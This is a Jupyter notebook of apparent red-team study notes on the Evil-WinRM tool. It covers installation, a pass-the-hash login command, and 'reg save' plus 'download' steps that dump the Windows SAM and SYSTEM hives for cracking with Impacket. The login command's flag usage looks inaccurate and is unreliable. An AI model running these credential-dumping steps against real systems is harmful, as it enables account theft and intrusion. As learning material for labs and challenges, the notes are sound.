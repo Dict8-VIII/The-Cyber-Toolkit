{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "7038a8ca-c5f2-4814-9293-27f676ba89c2",
   "metadata": {},
   "source": [
    "# Evil-WinRM\n",
    "\n",
    "A rather noisy tool for (shockingly) exploiting a Windows machine. While it's fun for a lot of challenges it could be quite loud in the real world. I'd limit it to pass-the-hash attacks remotely.\n",
    "\n",
    "<hr>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f17f9728-de03-48a4-a555-c97362ff3dd2",
   "metadata": {},
   "source": [
    "## Install\n",
    "\n",
    "> sudo apt install evil-winrm\n",
    "\n",
    "<hr>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b3d14b42-9ec5-4019-98a7-438016b142d5",
   "metadata": {},
   "source": [
    "## Log in with a Hash\n",
    "Known as a 'pass the hash' attack, in this case you can log into an account without knowing what the password is. This is because the password isnt actually transmittied during authentication, the hash is. As we know, hashes are one-way, so you cant recover the password from the hash except for brute forcing, so this is considered safe. The problem is that if you can retrieve a password hash for a user, you can just use a compatiable application (Such as Evil-WinRM) to transmit the hash instead.\n",
    "\n",
    "> evil-winrm -u [username] -h [password]\n",
    "\n",
    "![EvilWinRM_Example.png](../../Images/Goals/RedTeam/EvilWinRM_Example.png)\n",
    "\n",
    "<hr>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "29682676-2c8e-4d2f-8a4f-0c6856c3c197",
   "metadata": {},
   "source": [
    "## Dumping Hashes\n",
    "Pass the Hash is great, but it requires one tiny little detail - the hash. As the only thing between a hash and a password is CPU power, Hashes are also tightly regulated. Normally only Administrator or System level accounts are permitted to view or modify password hashes. For this stage, I'm assuming you already have these rights. If you dont, try the [PrivilegeEscalation](PriveligeEscalation/WindowsPrivEsc.ipynb) room.\n",
    "\n",
    "> reg save hklm\\system system.bak\n",
    "> reg save hklm\\sam sam.bak\n",
    "> download system.bak\n",
    "> download sam.bak\n",
    "\n",
    "You can then pass these to [Impacket](Impacket.ipynb) to dump the secrets.\n",
    "\n",
    "<hr>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "585bb785-833c-4432-af9a-e34e586a2c83",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}